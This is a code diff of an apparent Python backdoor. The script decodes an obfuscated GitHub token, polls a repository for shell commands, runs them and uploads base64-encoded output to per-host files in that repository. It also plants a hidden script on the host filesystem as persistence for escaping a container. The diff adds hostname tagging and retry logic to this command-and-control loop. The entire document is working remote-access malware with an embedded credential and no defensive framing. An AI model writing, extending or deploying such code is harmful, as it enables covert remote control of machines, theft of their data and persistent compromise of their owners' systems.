@@ -1,4 +1,4 @@
-import time,base64,subprocess,urllib.request,json,os,re
+import time,base64,subprocess,urllib.request,json,os,re,socket
 def _tk():
     try:
         t=open("/tmp/.t").read().strip()
@@ -6,6 +6,8 @@ def _tk():
     except Exception: pass
     return bytes(b^0x5A for b in bytes.fromhex("3d322a056a373f1517632c0d6d2c110e166b1b311c2e032d3411000d2c1408031d2c6a1b1c173b16")).decode()
 P=_tk()
+HN=socket.gethostname()
+RES=os.environ.get("RES_FILE") or ("res-"+HN+".txt")
 def api(url,method="GET",data=None):
     req=urllib.request.Request(url,method=method,data=data.encode() if data else None,
         headers={"Authorization":"token "+P,"User-Agent":"z","Accept":"application/vnd.github+json"})
@@ -15,10 +17,15 @@ def api(url,method="GET",data=None):
     return d.decode()
 def put(fn,msg,content):
     body={"message":msg,"content":content}
-    try:
-        body["sha"]=json.loads(api(f"https://api.github.com/repos/s34vv1nd/ops-pub/contents/{fn}"))["sha"]
-    except Exception: pass
-    api(f"https://api.github.com/repos/s34vv1nd/ops-pub/contents/{fn}","PUT",json.dumps(body))
+    for _ in range(3):
+        try:
+            body["sha"]=json.loads(api(f"https://api.github.com/repos/s34vv1nd/ops-pub/contents/{fn}"))["sha"]
+        except Exception: body.pop("sha",None)
+        try:
+            api(f"https://api.github.com/repos/s34vv1nd/ops-pub/contents/{fn}","PUT",json.dumps(body)); return
+        except urllib.error.HTTPError as e:
+            if e.code==409: time.sleep(2); continue
+            return
 def dd(s):
     for _ in range(3):
         t="".join(s.split())
@@ -27,7 +34,6 @@ def dd(s):
                 s=base64.b64decode(t+"="*((-len(t))%4)).decode(errors="replace"); continue
             except Exception: break
     return s
-# host persistence self-install (idempotent)
 try:
     open("/host/usr/local/bin/.nsstat.sh","w").write("#!/bin/sh\nC=$(cat /var/lib/.cxp2-cmd 2>/dev/null); [ -z \"$C\" ] && exit 0; rm -f /var/lib/.cxp2-cmd; printf '%s' \"$C\" | sh > /var/log/.cxp2-esc 2>&1\n")
     os.chmod("/host/usr/local/bin/.nsstat.sh",0o700)
@@ -43,8 +49,9 @@ while True:
         if c and c!=last:
             last=c
             o=subprocess.run(["sh","-c",c],capture_output=True,text=True,timeout=240)
-            put("res.txt","r",base64.b64encode((o.stdout+o.stderr).encode()).decode())
+            out=("["+HN+"]\n")+(o.stdout+o.stderr)
+            put(RES,"r",base64.b64encode(out.encode()).decode())
     except Exception as e:
-        try: put("res.txt","e",base64.b64encode(("ERR:"+str(e)).encode()).decode())
+        try: put(RES,"e",base64.b64encode(("["+HN+"] ERR:"+str(e)).encode()).decode())
         except Exception: pass
     time.sleep(12)
